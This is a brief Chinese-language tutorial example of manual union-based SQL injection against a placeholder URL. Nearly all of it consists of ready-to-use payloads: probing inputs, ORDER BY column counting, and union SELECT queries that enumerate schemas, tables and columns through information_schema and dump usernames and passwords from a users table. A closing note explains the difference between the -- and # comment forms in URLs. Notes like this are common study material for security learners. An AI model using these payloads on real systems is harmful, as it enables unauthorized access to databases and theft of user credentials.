#### 示例

```
#网址:http://xx.xx/#/1
#F12查看发现请求url: http://xx.xx?id=1
#探测输入:
    id=1'         		 	
    id=1' --+     		 	
    id=1' and 1=1 --+   	
    id =1 and 1=2 --+		#继续探测,发现问题
    id=1 order by 1 --+   	# 正常
    id=1 order by 2 --+   	#正常	
    id=1 order by 3 --+   	#报错
#说明只有 2列 可以回显
然后,查看库信息,表信息,版本信息等...
    id=-1 union select 1,database() --+
    id=-1 union select 1,user() --+
    id=-1 union select 1,version() --+
    组payload爆库,表,列,数据:
    -1 union select 1,group_concat(schema_name) from information_schema.schemata --+ 		#查库
    #根据库名,查表	当前库:database()
    union select 1,group_concat(table_name) from information_schema.tables where table_schema='schemaname' --+
    #根据库名和表名,查列
    union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='schemaname'  --+
    #查字段
    union select 1,group_concat(username,0x3a,password) from schemaname.users --+
    
```

```
注释符号 # 和 -- 区别:
--: 标准SQL, 后面必须紧跟至少一个空格（或控制字符如换行），注释才会生效
	常用 --+（在 Web 环境中，+ 会被解析为空格，从而满足 -- 必须带空格的规范）

# : 非标准 SQL,
	在 URL 传输时需要编码为 %23
```



